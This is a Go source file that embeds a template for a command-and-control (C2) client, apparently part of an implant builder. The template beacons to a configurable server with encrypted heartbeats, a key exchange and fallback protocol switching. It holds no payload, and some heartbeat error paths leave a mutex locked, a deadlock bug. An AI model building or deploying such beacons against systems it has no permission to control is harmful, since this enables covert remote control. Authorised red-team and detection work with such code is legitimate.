package main

const clientTemplate = `package main

import (
	"bytes"
	"encoding/binary"
	"flag"
	"fmt"
	"hash/crc32"
	"io"
	"log"
	"net"
	"os"
	"os/signal"
	"strings"
	"sync"
	"syscall"
	"time"
	
	"client/pkg/crypto"
	"client/pkg/protocol"
)

var (
	serverAddr      string
	protocolList    string
	currentProtocol string
	encryptor       crypto.Encryptor
	protocolHandler *protocol.ProtocolHandler
	sessionID       crypto.SessionID
	connMutex       sync.Mutex
	isConnected     bool
	lastHeartbeat   time.Time
	tcpConn         net.Conn // Add this line to store the TCP connection
)

func main() {
	// Parse command line flags
	flag.StringVar(&serverAddr, "server", BuildConfig.ServerAddr, "C2 server address")
	flag.StringVar(&protocolList, "protocol", strings.Join(BuildConfig.Protocols, ","), "Comma-separated list of protocols to use")
	flag.Parse()

	if serverAddr == "" {
		fmt.Println("Error: Server address is required")
		flag.Usage()
		os.Exit(1)
	}

	// Parse protocol list
	protocols := strings.Split(protocolList, ",")
	if len(protocols) == 0 {
		fmt.Println("Error: At least one valid protocol must be specified")
		flag.Usage()
		os.Exit(1)
	}

	// Initialize encryption
	var err error
	
	if BuildConfig.EncryptionAlg == "aes" {
		encryptor, err = crypto.NewAESEncryptor()
	} else if BuildConfig.EncryptionAlg == "chacha20" {
		encryptor, err = crypto.NewChacha20Encryptor()
	} else {
		log.Fatalf("Unsupported encryption algorithm: %s", BuildConfig.EncryptionAlg)
	}
	
	if err != nil {
		log.Fatalf("Failed to initialize encryption: %v", err)
	}

	// Initialize protocol handler
	protocolHandler = protocol.NewProtocolHandler()
	sessionID = crypto.GenerateSessionID()
	
	// Setup signal handling for graceful shutdown
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	// Start with the first protocol
	currentProtocol = protocols[0]
	
	// Connect to server
	if err := connect(currentProtocol, serverAddr); err != nil {
		log.Printf("Failed to connect with protocol %s: %v", currentProtocol, err)
		
		// Try other protocols if available
		if len(protocols) > 1 && BuildConfig.ActiveSwitching {
			for i := 1; i < len(protocols); i++ {
				currentProtocol = protocols[i]
				if err := connect(currentProtocol, serverAddr); err == nil {
					break
				}
				log.Printf("Failed to connect with protocol %s: %v", currentProtocol, err)
			}
		}
	}
	
	if !isConnected {
		log.Fatalf("Failed to connect to server with any protocol")
	}

	// Start heartbeat
	go sendHeartbeats()
	
	// Start protocol switching monitor if active switching is enabled
	if BuildConfig.ActiveSwitching && len(protocols) > 1 {
		go monitorConnection(protocols)
	}

	// Wait for termination signal
	<-sigChan
	fmt.Println("\nShutting down client...")
	
	// Perform clean shutdown
	disconnect()
	
	fmt.Println("Client shutdown complete.")
}

func connect(protocol, address string) error {
	connMutex.Lock()
	defer connMutex.Unlock()
	
	// Implementation would connect using the specified protocol
	log.Printf("Connecting to %s using protocol %s", address, protocol)
	
	// Establish TCP connection
	conn, err := net.DialTimeout("tcp", address, 10*time.Second)
	if err != nil {
		log.Printf("Failed to connect to server: %v", err)
		return err
	}
	
	// Create a key exchange packet with the session ID as data
	keyExchangePacket := createPacket(6, []byte(sessionID)) // 6 = PacketTypeKeyExchange
	
	// Encode and encrypt the packet
	encryptedPacket, err := encryptPacket(keyExchangePacket)
	if err != nil {
		log.Printf("Failed to encrypt packet: %v", err)
		conn.Close()
		return err
	}
	
	// Send the packet directly without fragment header for the initial key exchange
	_, err = conn.Write(encryptedPacket)
	if err != nil {
		log.Printf("Failed to send message: %v", err)
		conn.Close()
		return err
	}
	
	log.Printf("Sent key exchange packet to server")
	
	// Wait for response - read multiple times to handle fragmentation
	responseBuffer := make([]byte, 4096)
	totalBytes := 0
	
	// Read with a timeout to handle potential fragmentation
	conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	
	for {
		n, err := conn.Read(responseBuffer[totalBytes:])
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				// Timeout is expected after we've read all available data
				break
			}
			
			if err == io.EOF && totalBytes > 0 {
				// EOF with data is fine
				break
			}
			
			log.Printf("Failed to read response: %v", err)
			conn.Close()
			return err
		}
		
		totalBytes += n
		if n < 1024 {
			// If we got a small read, likely we've read everything
			break
		}
	}
	
	// Reset deadline
	conn.SetReadDeadline(time.Time{})
	
	// Process response data
	responseData := responseBuffer[:totalBytes]
	log.Printf("Received %d bytes response from server", len(responseData))
	
	// Process the response data directly
	if totalBytes > 0 {
		log.Printf("Processing response data")
	}
	
	log.Printf("Received response from server")
	
	// Store the connection for later use
	tcpConn = conn
	
	// Update connection state
	isConnected = true
	lastHeartbeat = time.Now()
	
	log.Printf("Connected to server: %s using protocol: %s with encryption: %s", 
		address, protocol, BuildConfig.EncryptionAlg)
	return nil
}

func disconnect() {
	connMutex.Lock()
	defer connMutex.Unlock()
	
	if !isConnected {
		return
	}
	
	// Close the TCP connection if it exists
	if tcpConn != nil {
		log.Println("Closing TCP connection")
		tcpConn.Close()
		tcpConn = nil
	}
	
	log.Println("Disconnected from server")
	
	// Update connection state
	isConnected = false
}

func sendHeartbeats() {
	for {
		time.Sleep(time.Duration(BuildConfig.HeartbeatInterval) * time.Second)
		
		connMutex.Lock()
		if !isConnected {
			connMutex.Unlock()
			continue
		}
		
	// Create heartbeat packet
	heartbeatPacket := createPacket(0, []byte("heartbeat")) // 0 = PacketTypeHeartbeat
	
	// Encode and encrypt the packet
	encryptedPacket, err := encryptPacket(heartbeatPacket)
	if err != nil {
		log.Printf("Failed to encrypt heartbeat packet: %v", err)
		continue
	}
	
	if tcpConn != nil {
		// Send the packet directly
		_, err := tcpConn.Write(encryptedPacket)
		if err != nil {
			log.Printf("Failed to send heartbeat message: %v", err)
			continue
		}
		
		log.Println("Sent heartbeat with encryption algorithm:", BuildConfig.EncryptionAlg)
	} else {
		log.Println("Cannot send heartbeat: not connected")
	}
		
		// Update last heartbeat time
		lastHeartbeat = time.Now()
		connMutex.Unlock()
	}
}

func monitorConnection(protocols []string) {
	currentProtocolIndex := 0
	for i, p := range protocols {
		if p == currentProtocol {
			currentProtocolIndex = i
			break
		}
	}
	
	for {
		time.Sleep(5 * time.Second)
		
		connMutex.Lock()
		if !isConnected || time.Since(lastHeartbeat) > time.Duration(BuildConfig.HeartbeatInterval*3)*time.Second {
			// Connection lost or heartbeat timeout, try next protocol
			nextIndex := (currentProtocolIndex + 1) % len(protocols)
			nextProtocol := protocols[nextIndex]
			
			log.Printf("Switching from protocol %s to %s", currentProtocol, nextProtocol)
			
			// Disconnect if still connected
			if isConnected {
				// Implementation would disconnect
				isConnected = false
			}
			
			connMutex.Unlock()
			
			// Try to connect with next protocol
			if err := connect(nextProtocol, serverAddr); err != nil {
				log.Printf("Failed to connect with protocol %s: %v", nextProtocol, err)
			} else {
				currentProtocol = nextProtocol
				currentProtocolIndex = nextIndex
			}
		} else {
			connMutex.Unlock()
		}
	}
}

// createPacket creates a new packet with the specified type and data
func createPacket(packetType uint8, data []byte) *protocol.Packet {
	// Create a new packet with the specified type and data
	packet := &protocol.Packet{
		Header: protocol.PacketHeader{
			Version:      1, // Protocol version (must match ProtocolVersion in server)
			EncAlgorithm: 0, // No encryption for initial packet
			Type:         protocol.PacketType(packetType),
			TaskID:       0, // Will be set by the task manager
			Checksum:     0, // Will be calculated during encoding
		},
		Data: data,
	}
	
	return packet
}




// encryptPacket encodes and encrypts a packet using the current encryptor
func encryptPacket(packet *protocol.Packet) ([]byte, error) {
	// Set encryption algorithm based on BuildConfig
	if BuildConfig.EncryptionAlg == "aes" {
		packet.Header.EncAlgorithm = 1 // EncryptionAlgorithmAES = 1
	} else if BuildConfig.EncryptionAlg == "chacha20" {
		packet.Header.EncAlgorithm = 2 // EncryptionAlgorithmChacha20 = 2
	} else {
		packet.Header.EncAlgorithm = 0 // EncryptionAlgorithmNone = 0
	}
	
	// For key exchange packets, always use no encryption
	if packet.Header.Type == 6 { // PacketTypeKeyExchange
		packet.Header.EncAlgorithm = 0 // EncryptionAlgorithmNone = 0
		
		// Encode the packet (this will calculate the checksum)
		encodedPacket := encodePacket(packet)
		return encodedPacket, nil
	}
	
	// For other packets, encode first, then encrypt
	encodedPacket := encodePacket(packet)
	
	// Encrypt the encoded packet
	encrypted, err := encryptor.Encrypt(encodedPacket)
	if err != nil {
		return nil, err
	}
	
	return encrypted, nil
}

// encodePacket encodes a packet into bytes with proper checksum
func encodePacket(p *protocol.Packet) []byte {
	buf := new(bytes.Buffer)
	
	// Reserve space for header
	headerBytes := make([]byte, 12) // HeaderSize = 12
	
	// Set header fields
	headerBytes[0] = p.Header.Version
	headerBytes[1] = byte(p.Header.EncAlgorithm)
	headerBytes[2] = byte(p.Header.Type)
	
	// Set TaskID (4 bytes)
	binary.BigEndian.PutUint32(headerBytes[3:7], p.Header.TaskID)
	
	// Reserve space for checksum (4 bytes)
	// Will be calculated after writing data
	
	// Write header to buffer
	buf.Write(headerBytes)
	
	// Write data to buffer
	buf.Write(p.Data)
	
	// Get the full packet bytes
	packetBytes := buf.Bytes()
	
	// Calculate checksum (excluding the checksum field itself)
	// Create a copy with zero checksum for calculation
	checksumData := make([]byte, len(packetBytes))
	copy(checksumData, packetBytes)
	
	// Zero out the checksum field in the copy
	binary.BigEndian.PutUint32(checksumData[7:11], 0)
	
	// Calculate checksum
	checksum := crc32.ChecksumIEEE(checksumData)
	
	// Set checksum in the original packet bytes
	binary.BigEndian.PutUint32(packetBytes[7:11], checksum)
	
	return packetBytes
}
`
